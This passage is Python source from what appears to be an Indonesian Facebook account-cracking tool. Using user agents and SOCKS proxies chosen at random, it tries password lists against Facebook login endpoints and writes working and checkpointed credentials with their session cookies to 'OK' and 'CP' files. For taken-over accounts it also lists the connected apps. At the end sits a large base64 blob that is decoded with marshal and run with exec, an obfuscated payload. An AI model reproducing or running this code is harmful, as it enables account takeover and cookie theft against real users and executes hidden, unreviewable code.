			p = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'free.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r └── Email  : {kk}{idf}{P}          \n│   └──  Sandi  : {kk}{pw}          {P}\n└── User Agent  : {kk}{ua}{P}           \n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r├── Email  : {hh}{idf}{P}          \n│   └──  sandi  : {hh}{pw}          {P}\n└──  Cookie : {hh}{kuki}{P}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				#os.popen('play-audio data/ok.mp3')
				#cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	#----------------------[ METHODE-UNIPIN ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r🔥 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}——>{k} {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}{N}')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					os.popen('play-audio data/ok.mp3')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
					os.popen('play-audio data/ok.mp3')
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()


try:
	import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(binascii.a2b_base64(b'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